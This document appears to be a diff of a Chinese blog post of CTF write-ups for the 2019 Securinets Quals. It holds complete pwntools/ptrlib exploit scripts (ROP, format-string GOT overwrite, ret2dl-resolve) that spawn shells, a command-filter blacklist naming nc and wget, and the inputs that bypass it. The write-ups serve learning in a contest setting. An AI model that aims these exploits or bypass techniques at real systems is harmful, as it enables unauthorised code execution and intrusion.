+-rw-r--r--   1 root            root                0 Mar 25 02:13 .bash_history
+-rw-r--r--   1 welcome         welcome             0 Mar 24 00:22 .bash_logout
+-rw-r--r--   1 welcome         welcome             1 Mar 24 13:33 .bashrc
+-rw-r--r--   1 welcome         welcome           655 May 16  2017 .profile
+-r--------   1 welcome-cracked welcome-cracked    76 Mar 23 20:23 flag.txt
+-r--------+  1 welcome-cracked welcome          8712 Mar 23 19:09 welcome
+-rw-r-----   1 root            root              175 Mar 23 12:27 welcome.c
+-r-s--x---   1 welcome-cracked welcome         13088 Mar 23 20:13 wrapper
+-rw-r--r--   1 root            root             1741 Mar 23 20:13 wrapper.c
+</code></pre>
+<p>wrapper 是可以执行的，源码也能查看，可以大致看看做了什么：</p>
+<pre><code class="cpp">/* author : Anis_Boss */
+#include &lt;stdio.h&gt;
+
+
+
+int search(char str[], char word[])
+{
+    int l, i, j;
+    /*length of word */
+   for (l = 0; word[l] != &#39;\0&#39;; l++);
+    for (i = 0, j = 0; str[i] != &#39;\0&#39; &amp;&amp; word[j] != &#39;\0&#39;; i++)
+    {
+        if (str[i] == word[j])
+        {
+            j++;
+        }
+        else
+        {
+            j = 0;
+        }
+    }
+    if (j == l)
+    {
+        /* substring found */
+        return (i - j);
+    }
+    else
+    {
+        return  - 1;
+    }
+}
+
+int delete_word(char str[], char word[], int index)
+{
+    int i, l;
+    /* length of word */
+    for (l = 0; word[l] != &#39;\0&#39;; l++);
+
+    for (i = index; str[i] != &#39;\0&#39;; i++)
+    {
+        str[i] = str[i + l + 1];
+    }
+}
+
+void main(int argc, char* argv[])
+{
+char * blacklist[]={&quot;cat&quot;,&quot;head&quot;,&quot;less&quot;,&quot;more&quot;,&quot;cp&quot;,&quot;man&quot;,&quot;scp&quot;,&quot;xxd&quot;,&quot;dd&quot;,&quot;od&quot;,&quot;python&quot;,&quot;perl&quot;,&quot;ruby&quot;,&quot;tac&quot;,&quot;rev&quot;,&quot;xz&quot;,&quot;tar&quot;,&quot;zip&quot;,&quot;gzip&quot;,&quot;mv&quot;,&quot;flag&quot;,&quot;txt&quot;,&quot;python&quot;,&quot;perl&quot;,&quot;vi&quot;,&quot;vim&quot;,&quot;nano&quot;,&quot;pico&quot;,&quot;awk&quot;,&quot;grep&quot;,&quot;egrep&quot;,&quot;echo&quot;,&quot;find&quot;,&quot;exec&quot;,&quot;eval&quot;,&quot;regexp&quot;,&quot;tail&quot;,&quot;head&quot;,&quot;less&quot;,&quot;cut&quot;,&quot;tr&quot;,&quot;pg&quot;,&quot;du&quot;,&quot;`&quot;,&quot;$&quot;,&quot;(&quot;,&quot;)&quot;,&quot;#&quot;,&quot;bzip2&quot;,&quot;cmp&quot;,&quot;split&quot;,&quot;paste&quot;,&quot;diff&quot;,&quot;fgrep&quot;,&quot;gawk&quot;,&quot;iconv&quot;,&quot;ln&quot;,&quot;most&quot;,&quot;open&quot;,&quot;print&quot;,&quot;read&quot;,&quot;{&quot;,&quot;}&quot;,&quot;sort&quot;,&quot;uniq&quot;,&quot;tee&quot;,&quot;wget&quot;,&quot;nc&quot;,&quot;hexdump&quot;,&quot;HOSTTYPE&quot;,&quot;$&quot;,&quot;arch&quot;,&quot;env&quot;,&quot;tmp&quot;,&quot;dev&quot;,&quot;shm&quot;,&quot;lock&quot;,&quot;run&quot;,&quot;var&quot;,&quot;snap&quot;,&quot;nano&quot;,&quot;read&quot;,&quot;readlink&quot;,&quot;zcat&quot;,&quot;tailf&quot;,&quot;zcmp&quot;,&quot;zdiff&quot;,&quot;zegrep&quot;,&quot;zdiff&quot;};
+
+
+ char str[80], word[50];
+    int index;
+    printf(&quot;Welcome to Securinets Quals CTF \o/ \n&quot;);
+    printf(&quot;Enter string:\n&quot;);
+    read(0,str,79);
+for (int i=0;i&lt;sizeof(blacklist)/sizeof(blacklist[0]);i++)
+{
+    index = search(str, blacklist[i]);
+
+    if (index !=  - 1)
+    {
+        delete_word(str, blacklist[i], index);
+    }
+
+}
+setreuid(geteuid(),geteuid());
+close(0);
+system(str);
+}
+</code></pre>
+<p>我们需要做的就是想办法绕过 blacklist，然后。基础绕过方式：</p>
+<pre><code class="bash">welcome@vps614257:~$ ./wrapper
+Welcome to Securinets Quals CTF o/
+Enter string:
+catccat flagfflag.txtttxt
+securinets{who_needs_exec_flag_when_you_have_linker_reloaded_last_time!!!?}
+</code></pre>
+<p>进阶绕过方式，利用<code>*</code>通配：</p>
+<pre><code class="bash">welcome@vps614257:~$ ./wrapper
+Welcome to Securinets Quals CTF o/
+Enter string:
+/bin/ca* fla*
+securinets{who_needs_exec_flag_when_you_have_linker_reloaded_last_time!!!?}
+</code></pre>
+<p>高级绕过方式，sed 正则匹配：</p>
+<pre><code class="bash">welcome@vps614257:~$ ./wrapper
+Welcome to Securinets Quals CTF o/
+Enter string:
+sed &#39;&#39; fla*
+securinets{who_needs_exec_flag_when_you_have_linker_reloaded_last_time!!!?}
+</code></pre>
+<p><a href="https://github.com/AnisBoss/CTFs/tree/master/Securinets-CTF-QUALS-2019/welcome" target="_blank" rel="noopener">官方给的 wp</a>：</p>
+<pre><code class="bash">welcome@vps614257:~$ ./wrapper
+Welcome to Securinets Quals CTF o/
+Enter string:
+/lib64/ld-linux-x86-64.so.2 ./welcome
+securinets{who_needs_exec_flag_when_you_have_linker_reloaded_last_time!!!?}
+</code></pre>
+<h2 id="Baby-one"><a href="#Baby-one" class="headerlink" title="Baby one"></a>Baby one</h2><pre><code>$ checksec ./baby1
+[*] &#39;/Users/qianfei/Desktop/baby1&#39;
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</code></pre><p>ida 反编译出 main 函数：</p>
+<pre><code class="cpp">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char buf; // [rsp+0h] [rbp-30h]
+
+  setvbuf(_bss_start, 0LL, 2, 0LL);
+  write(1, &quot;Welcome to securinets Quals!\n&quot;, 0x1DuLL);
+  return read(0, &amp;buf, 0x12CuLL);
+}
+</code></pre>
+<p>简单的 rop，利用 <code>__libc_csu_init</code> 来 call 函数，达到泄漏和 getshell。Exploit：</p>
+<pre><code class="python">#!/usr/bin/env python
+from pwn import *
+local = 0
+if local:
+    p = process(&#39;./baby1&#39;)
+else:
+    p = remote(&#39;51.254.114.246&#39;, 1111)
+elf = ELF(&#39;./baby1&#39;)
+read_plt = elf.plt[&#39;read&#39;]
+write_plt = elf.plt[&#39;write&#39;]
+read_got = elf.got[&#39;read&#39;]
+write_got = elf.got[&#39;write&#39;]
+main = elf.symbols[&#39;main&#39;]
+# gdb.attach(p)
+buf = 0x0602000-0x100
+
+#  4006a0:       4c 89 ea                mov    rdx,r13
+#  4006a3:       4c 89 f6                mov    rsi,r14
+#  4006a6:       44 89 ff                mov    edi,r15d
+#  4006a9:       41 ff 14 dc             call   QWORD PTR [r12+rbx*8]
+#  4006ad:       48 83 c3 01             add    rbx,0x1
+#  4006b1:       48 39 eb                cmp    rbx,rbp
+#  4006b4:       75 ea                   jne    4006a0 &lt;__libc_csu_init+0x40&gt;
+#  4006b6:       48 83 c4 08             add    rsp,0x8
+#  4006ba:       5b                      pop    rbx
+#  4006bb:       5d                      pop    rbp
+#  4006bc:       41 5c                   pop    r12
+#  4006be:       41 5d                   pop    r13
+#  4006c0:       41 5e                   pop    r14
+#  4006c2:       41 5f                   pop    r15
+#  4006c4:       c3                      ret
+def csu(rbx, rbp, r12, r13, r14, r15, addr):
+    payload = &#39;\x00&#39; * 56 + p64(0x4006ba) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(0x4006a0) + &#39;\x00&#39; * 56 + p64(addr)
+    p.sendline(payload)
+
+# payload = cyclic(500)
+offset = 56
+csu(0, 1, write_got, 8, write_got, 1, main)
+write = u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8, &#39;\x00&#39;))
+success(&#39;write = &#39; + hex(write))
+write_offset = 0x0f72b0
+libc_base = write - write_offset
+success(&#39;libc_base = &#39; + hex(libc_base))
+
+execve = libc_base + 0x0000000000cc770
+system = libc_base + 0x045390
+str_bin_sh = libc_base + 0x18cd57
+
+csu(0, 1, read_got, 16, buf, 0, main)
+p.send(p64(execve) + &#39;/bin/sh\x00&#39;)
+
+csu(0, 1, buf, 0, 0, buf + 8, main)
+
+p.interactive()
+</code></pre>
+<h2 id="Simple"><a href="#Simple" class="headerlink" title="Simple"></a>Simple</h2><pre><code class="bash">root@91120f278fdd:~/ctf/2019-Securinets/pwn/Simple# checksec ./simple
+[*] &#39;/root/ctf/2019-Securinets/pwn/Simple/simple&#39;
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</code></pre>
+<p>ida 反编译 main 函数：</p>
+<pre><code class="cpp">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char buf; // [rsp+0h] [rbp-50h]
+  unsigned __int64 v5; // [rsp+48h] [rbp-8h]
+
+  v5 = __readfsqword(0x28u);
+  setvbuf(_bss_start, 0LL, 2, 0LL);
+  read(0, &amp;buf, 0x3FuLL);
+  printf(&amp;buf, &amp;buf);
+  perror(&quot;hemm okay\n&quot;);
+  return __readfsqword(0x28u) ^ v5;
+}
+</code></pre>
+<p>在 printf 处可以看到格式化字符串漏洞，基本上这道题目就是多次利用了这个漏洞。第一次我们通过格式化字符串泄漏出 libc 的地址等相关信息，同时将 perror 的 got 表改成 main。第二次把 one_gadget 填到 ret 的地址上。第三次把 perror 的 got 表改回去，然后程序会直接 ret 到 one_gadget。Exploit：</p>
+<pre><code class="python">#!/usr/bin/env python
+from pwn import *
+context.log_level = &#39;debug&#39;
+context.arch = &#39;amd64&#39;
+local = 1
+if local:
+    p = process(&#39;./simple&#39;)
+    libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
+    one_gadget_offset = 0x4f322
+else:
+    p = remote(&#39;51.254.114.246&#39;, 4444)
+    libc = ELF(&#39;libc.so.6&#39;)
+    one_gadget_offset = 0x4526a
+elf = ELF(&#39;./simple&#39;)
+main = elf.symbols[&#39;main&#39;]
+perror_got = elf.got[&#39;perror&#39;]
+read_got = elf.got[&#39;read&#39;]
+
+payload = &#39;%14$p%10$s%1682c%9$hn&#39;
+payload += &#39;\x00&#39; * (24 - len(payload))
+payload += p64(perror_got)
+payload += p64(read_got)
+p.send(payload)
+
+leak = p.recv()
+offset = 0xd8
+ret = int(leak[0:14], 16) - offset
+
+read = u64(leak[14:20].ljust(8, &#39;\x00&#39;))
+success(&#39;read = &#39; + hex(read))
+libc_base = read - libc.symbols[&#39;read&#39;]
+success(&#39;libc_base = &#39; + hex(libc_base))
+one_gadget = libc_base + one_gadget_offset
+
+a0 = one_gadget &amp; 0xffff
+a1 = ((one_gadget &amp; 0xffff0000) &gt;&gt; 16)
+a1 = (a1 - a0 - 1) % 0x10000 + 1
+
+payload = &#39;%{}c%{}$hn&#39;.format(a0, 10)
+payload += &#39;%{}c%{}$hn&#39;.format(a1, 11)
+payload += &#39;\x00&#39; * (32 - len(payload))
+payload += p64(ret)
+payload += p64(ret + 2)
+p.sendline(payload)
+
+payload = &#39;%1430c%8$hn&#39;
+payload += &#39;\x00&#39; * (16 - len(payload))
+payload += p64(perror_got)
+p.sendline(payload)
+
+p.interactive()
+</code></pre>
+<h2 id="Baby-Two"><a href="#Baby-Two" class="headerlink" title="Baby Two"></a>Baby Two</h2><pre><code class="bash">$ checksec ./baby2
+[*] &#39;/Users/qianfei/ctf/ctf/2019-Securinets/pwn/Baby-Two/baby2&#39;
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+</code></pre>
+<p>ida 反编译 main 函数：</p>
+<pre><code class="cpp">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char buf; // [esp+8h] [ebp-30h]
+
+  setvbuf(_bss_start, 0, 2, 0);
+  return read(0, &amp;buf, 0x12Cu);
+}
+</code></pre>
+<p>只有一个 <code>read</code>，直接上 <code>ret2dl-resolve</code> 一把梭，以下是 <a href="https://github.com/ptr-yudai" target="_blank" rel="noopener">Yudai 大佬</a>的 exp，用到了大佬写的库 <a href="https://bitbucket.org/ptr-yudai/ptrlib/src/master/" target="_blank" rel="noopener">ptrlib</a>：</p>
+<pre><code class="python">#!/usr/bin/env python3
+from ptrlib import *
+import time
+
+elf = ELF(&#39;./baby2&#39;)
+
+addr_plt = 0x08048320
+addr_start = elf.symbol(&#39;_start&#39;)
+
+addr_relplt = elf.section(&#39;.rel.plt&#39;)
+addr_dynsym = elf.section(&#39;.dynsym&#39;)
+addr_dynstr = elf.section(&#39;.dynstr&#39;)
+addr_bss    = elf.section(&#39;.bss&#39;)
+
+rop_pop3 = 0x08048509
+rop_ret = 0x080482fa
+
+fname = &#39;system\x00&#39;
+farg  = &#39;/bin/sh\x00&#39;
+
+plt_read = 0x08048330
+base_stage = addr_bss + 0x800
+addr_reloc = addr_bss + 0xa00
+addr_sym   = addr_bss + 0xa80 | (addr_dynsym &amp; 0xF)
+addr_str   = addr_bss + 8
+addr_arg   = addr_str + len(fname)
+
+# Elf32_Rel
+reloc = p32(elf.got(&#39;setvbuf&#39;))
+reloc += p32((((addr_sym - addr_dynsym) // 0x10) &lt;&lt; 8) | 7)
+# Elf32_Sym
+sym = p32(addr_str - addr_dynstr)
+sym += p32(0)
+sym += p32(0)
+sym += p32(0x12)
+
+def craft_read(addr, size):
+    payload = p32(plt_read)
+    payload += p32(rop_pop3)
+    payload += p32(0)    # fd
+    payload += p32(addr) # buf
+    payload += p32(size) # size
+    return payload
+
+# ncat -vc ./baby2 -kl 8888
+sock = Socket(&#39;127.0.0.1&#39;, 8888)
+# sock = Socket(&#39;51.254.114.246&#39;, 2222)
+
+&#39;&#39;&#39; Stage 1 (probabilistic write) &#39;&#39;&#39;
+payload1 = b&#39;&#39;
+payload1 += p32(rop_ret) * ((0x2c - 6 * 4) // 4)
+payload1 += craft_read(base_stage, 0x100) # 5 * 4
+payload1 += p32(addr_start)               # 4
+payload1 += bytes([0x20])
+
+&#39;&#39;&#39; Stage 2 (stack pivot) &#39;&#39;&#39;
+payload2 = b&#39;A&#39; * 0x2c
+payload2 += p32(base_stage + 4)
+payload2 += b&#39;\x00&#39; * (0x12c - len(payload2))
+
+&#39;&#39;&#39; Stage 3 (craft) &#39;&#39;&#39;
+reloc_offset = addr_reloc - addr_relplt
+
+payload3 = b&#39;&#39;
+payload3 += craft_read(addr_reloc, 0x8)
+payload3 += craft_read(addr_sym, 0x10)
+payload3 += craft_read(addr_str, len(fname))
+payload3 += craft_read(addr_arg, len(farg))
+payload3 += p32(addr_plt)
+payload3 += p32(reloc_offset)
+payload3 += b&#39;XXXX&#39;
+payload3 += p32(addr_arg)
+payload3 += b&#39;\x00&#39; * (0x100 - len(payload3))
+
+# Stage 1
+sock.send(payload1)
+time.sleep(0.5)
+sock.send(payload3)
+
+# Stage 2
+sock.send(payload2)
+
+# Stage 3
+sock.send(reloc)
+sock.send(sym)
+sock.send(fname)
+sock.send(farg)
+
+sock.interactive()
+</code></pre>
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Feedback"><a href="#Feedback" class="headerlink" title="Feedback"></a>Feedback</h2><p>这是一道 XXE，通过 burpsuite 抓包，然后直接利用<a href="https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection" target="_blank" rel="noopener">网上的 exp</a>看到：</p>
+<p><img src="/pics/2019-Securinets-CTF-Quals/4.png" srcset="/img/loading.gif" alt></p>
+<p>然后同理，看到有 simple_user 这个用户，尝试看看能不能在家目录拿到 flag：</p>
+<p><img src="/pics/2019-Securinets-CTF-Quals/5.png" srcset="/img/loading.gif" alt></p>
+<p>发现没有，再试试 apche 根目录：</p>
+<p><img src="/pics/2019-Securinets-CTF-Quals/6.png" srcset="/img/loading.gif" alt></p>
+<p>还是不行。发现网站是 nginx 搭的，就 google 一下 <a href="https://stackoverflow.com/questions/10674867/nginx-default-public-www-location" target="_blank" rel="noopener">nginx 的默认 www 目录</a>：</p>
+<p><img src="/pics/2019-Securinets-CTF-Quals/7.png" srcset="/img/loading.gif" alt></p>
+<p>然后可以看到 root 的路径，尝试获得 flag：</p>
+<p><img src="/pics/2019-Securinets-CTF-Quals/8.png" srcset="/img/loading.gif" alt></p>
+<h1 id="Foren"><a href="#Foren" class="headerlink" title="Foren"></a>Foren</h1><h2 id="Easy-Trade"><a href="#Easy-Trade" class="headerlink" title="Easy Trade"></a>Easy Trade</h2><p>用 wireshark 打开给的 pcap 包，总共只有几十条信息，可以一条条看下来。首先可以看到给出的 key：</p>
+<p><img src="/pics/2019-Securinets-CTF-Quals/9.png" srcset="/img/loading.gif" alt></p>
+<p><img src="/pics/2019-Securinets-CTF-Quals/10.png" srcset="/img/loading.gif" alt></p>
+<p>然后再往下看可以找到一个 PK 头的 zip，看得到里面有 <code>flag.txt</code>：</p>
+<p><img src="/pics/2019-Securinets-CTF-Quals/11.png" srcset="/img/loading.gif" alt></p>
+<p>拿到 <code>flag.txt</code> 的内容后 base64 解密一下拿到 flag：</p>
+<pre><code class="shell">$ cat data
+securinetsXD
+
+$ unzip flag.zip
+Archive:  flag.zip
+[flag.zip] flag.txt password:
+ extracting: flag.txt
+
+$ cat flag.txt | base64 -D
+securinets{954f670cb291ec276b1a9ff8453ea60%
+</code></pre>
+<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="HIDDEN"><a href="#HIDDEN" class="headerlink" title="HIDDEN"></a>HIDDEN</h2><p>题目提示了在 url 栏中有些不一样的地方。可以看到这个网站用了 http 而不是 https：</p>
+<p><img src="/pics/2019-Securinets-CTF-Quals/12.png" srcset="/img/loading.gif" alt></p>
+<p>点开后在证书中看到 flag：</p>
+<p><img src="/pics/2019-Securinets-CTF-Quals/13.png" srcset="/img/loading.gif" alt></p>
+<h2 id="EZ"><a href="#EZ" class="headerlink" title="EZ"></a>EZ</h2><p>图片隐写，<a href="https://stylesuxx.github.io/steganography/" target="_blank" rel="noopener">在线解密一下</a>：</p>
+<pre><code>--START--
+&quot;The fact is that upon his entrance I had instantly recognized the extreme
+personal danger in which I lay. The only conceivable escape for him lay in silencing
+my tongue. In an instant I had slipped the revolver from the drawer into my
+pocket and was covering him through the cloth. At his remark I drew the weapon
+out and laid it cocked upon the table. He still smiled and blinked, but there was
+something about his eyes which made me feel very glad that I had it there,
+&quot;You evidently don&#39;t know me,&#39; said he.
+&quot;&#39;On the contrary,&#39; I answered, &#39;I think it is fairly evident that I do. Pray take
+a chair. I can spare you five minutes if you have anything to say.&#39;
+&quot;&#39;All that I have to say has already crossed your mind,&#39; said he.
+&quot;&#39;Then possibly my answer has crossed yours,&#39; I replied.
+&quot;&#39;You stand fast?&#39;
+&quot;&#39;Absolutely.&#39;
+&quot;He clapped his hand into his pocket, and I raised the pistol from the table.
+But he merely drew out a &lt;DETELED_WORD&gt; in which he had scribbled some
+dates.
+&quot;You crossed my path on the fourth of January,&#39; said he. &#39;On the twenty-third
+you incommoded me; by the middle of February I was seriously inconvenienced
+by you; at the end of March I was absolutely hampered in my plans; and now, at
+the close of April, I find myself placed in such a position through your continual
+persecution that I am in positive danger of losing my liberty. The situation is
+becoming an impossible one.&#39;
+&quot;&#39;Have you any suggestion to make?&#39; I asked.
+&quot;&#39;You must drop it, Mr. Holmes,&#39; said he, swaying his face about. &#39;You really
+must, you know.&#39;&quot;
+--END--;
+</code></pre><p>可以看到有一个单词被删掉了，根据题目提示我们需要找到这个单词。google 之后发现是<a href="https://www.pagebypagebooks.com/Arthur_Conan_Doyle/Memoirs_of_Sherlock_Holmes/Adventure_XI_The_Final_Problem_p4.html" target="_blank" rel="noopener">福尔摩斯的一个片段</a>，找到单词之后，<a href="http://www.sha1-online.com/" target="_blank" rel="noopener">在线 sha1</a> 哈希一下得到 flag。</p>
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="http://dann.com.br/alexctf2k17-crypto100-many_time_secrets/" target="_blank" rel="noopener">http://dann.com.br/alexctf2k17-crypto100-many_time_secrets/</a><br><a href="https://www.youtube.com/watch?v=r23Yk2lutJ0&amp;feature=youtu.be" target="_blank" rel="noopener">https://www.youtube.com/watch?v=r23Yk2lutJ0&amp;feature=youtu.be</a><br><a href="https://ptr-yudai.hatenablog.com/entry/2019/03/25/152043" target="_blank" rel="noopener">https://ptr-yudai.hatenablog.com/entry/2019/03/25/152043</a><br><a href="https://www.rootnetsec.com/securinets-prequals-automateme/" target="_blank" rel="noopener">https://www.rootnetsec.com/securinets-prequals-automateme/</a><br><a href="https://ctftime.org/writeup/14075" target="_blank" rel="noopener">https://ctftime.org/writeup/14075</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <p>
+                
+                
+                  <span>
+                <i class="iconfont icon-tag"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/wp/">wp</a>
+                    
+                  </span>
+                
+              </p>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-12 col-md-6">
+                    
+                      <a href="/2019/03/31/2019-b00t2root-CTF/">
+                        <i class="fa fa-chevron-left"></i>
+                        <span>2019-b00t2root-CTF</span>
+                      </a>
+                    
+                  </div>
+                  <div class="post-next col-12 col-md-6">
+                    
+                      <a href="/2019/03/17/Buffer-Overflow-with-gcc-4-9/">
+                        <span>Buffer Overflow with gcc&gt;=4.9</span>
+                        <i class="fa fa-chevron-right"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+              
+          </div>
+        </div>
       </div>
-
     </div>
-    <!-- <nav id="mobile-nav">
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;TOC</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
   
-    <a href="/" class="mobile-nav-link">Home</a>
-  
-    <a href="/archives" class="mobile-nav-link">Archives</a>
-  
-    <a href="/tags" class="mobile-nav-link">Tags</a>
-  
-    <a href="/about" class="mobile-nav-link">About</a>
-  
-</nav> -->
-    <footer id="footer" class="site-footer">
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
   
 
-  <div class="clearfix container">
-      <div class="site-info">
-	      &copy; 2020 AssassinQ All Rights Reserved.
-        
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
       </div>
-      <div class="site-credit">
-        Theme by <a href="https://github.com/iTimeTraveler/hexo-theme-hipaper" target="_blank">hipaper</a>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
       </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="http://blog.b3ale.cn" target="_blank" rel="nofollow noopener"><b>Hard Work Pays Off.</b></a>
+    </div>
+    
+  <div>
+    
+      <!-- 不蒜子统计PV -->
+      
+      <span id="busuanzi_container_site_pv" style="display: none">
+      总访问量 <span id="busuanzi_value_site_pv"></span> 次
+    </span>
+    
+    
+      <!-- 不蒜子统计UV -->
+      
+      <span id="busuanzi_container_site_uv" style="display: none">
+      总访客数 <span id="busuanzi_value_site_uv"></span> 人
+    </span>
+    
+  </div>
+
+
+    
+
+    
   </div>
 </footer>
 
-
-<!-- min height -->
-
-<script>
-    var wrapdiv = document.getElementById("wrap");
-    var contentdiv = document.getElementById("content");
-
-    wrapdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
-    contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
-
-
-    <!-- headerblur min height -->
-    
-      var headerblur = document.getElementById("header-blur");
-      headerblur.style.minHeight = window.getComputedStyle(document.getElementById("allheader"), null).height;
-    
-    
-</script>
-    
-<div style="display: none;">
-  <script src="https://s11.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
-</div>
-
-<!-- mathjax config similar to math.stackexchange -->
-
-<script type="text/x-mathjax-config">
-  MathJax.Hub.Config({
-    tex2jax: {
-      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
-      processEscapes: true
-    }
-  });
-</script>
-
-<script type="text/x-mathjax-config">
-    MathJax.Hub.Config({
-      tex2jax: {
-        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
-      }
-    });
-</script>
-
-<script type="text/x-mathjax-config">
-    MathJax.Hub.Queue(function() {
-        var all = MathJax.Hub.getAllJax(), i;
-        for(i=0; i < all.length; i += 1) {
-            all[i].SourceElement().parentNode.className += ' has-jax';
-        }
-    });
-</script>
-
-<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
-</script>
-
-
-  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
-  <script src="/fancybox/jquery.fancybox.pack.js"></script>
-
-
-<script src="/js/script.js"></script>
-<script src="/js/bootstrap.js"></script>
+<!-- SCRIPTS -->
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+<script src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js"></script>
+<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
+<script src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js"></script>
 <script src="/js/main.js"></script>
 
 
+  <script src="/js/lazyload.js"></script>
+
+
+
+  
+  <script src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var toc = $('#toc');
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+      var tocLimMax = 2 * boardTop + boardCtn.height();
+
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
+
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = boardCtn.css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
 
 
 
 
 
-  <div style="display: none;">
-    <script src="https://s95.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
-  </div>
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
 
 
 
+<!-- Plugins -->
 
 
 
+  <script src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
 
-  </div>
 
-  <a id="rocket" href="#top" class=""></a>
-  <script type="text/javascript" src="/js/totop.js" async=""></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+
+  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "2019-Securinets-CTF-Quals&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js"></script>
+  <script>
+    var path = "/local-search.xml";
